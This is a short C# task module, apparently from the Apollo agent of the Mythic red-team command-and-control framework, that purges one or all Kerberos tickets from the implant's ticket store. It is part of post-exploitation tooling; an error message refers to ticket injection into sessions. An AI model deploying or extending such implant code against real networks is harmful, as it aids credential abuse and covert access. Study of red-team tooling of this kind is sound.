#define COMMAND_NAME_UPPER

#if DEBUG
#define TICKET_STORED_PURGE
#endif

#if TICKET_STORED_PURGE

using System;
using System.Runtime.Serialization;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;

namespace Tasks;

public class ticket_store_purge : Tasking
{
    
    [DataContract]
    internal struct ticket_store_purgeParameters
    {
        [DataMember(Name = "base64ticket")]
        internal string? base64Ticket;
        [DataMember(Name = "all")]
        internal bool all;
    }

    public ticket_store_purge(IAgent agent, MythicTask data) : base(agent, data)
    { }
    public override void Start()
    {
        MythicTaskResponse resp = new MythicTaskResponse { };
        try
        {
            ticket_store_purgeParameters parameters = _jsonSerializer.Deserialize<ticket_store_purgeParameters>(_data.Parameters);
            string? base64Ticket = parameters.base64Ticket;
            bool all = parameters.all;
            bool ticketRemoved = _agent.GetTicketManager().RemoveTicketFromTicketStore(base64Ticket, all);
            //if true return without error if false return with error
            resp = ticketRemoved ? CreateTaskResponse($"Purged Ticket from Store", true) 
                : CreateTaskResponse($"Failed to purge ticket from Store", true, "error");
        }
        catch (Exception e)
        {
            resp = CreateTaskResponse($"Failed to inject ticket into session: {e.Message}", true, "error");
        }
        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
    }
}
#endif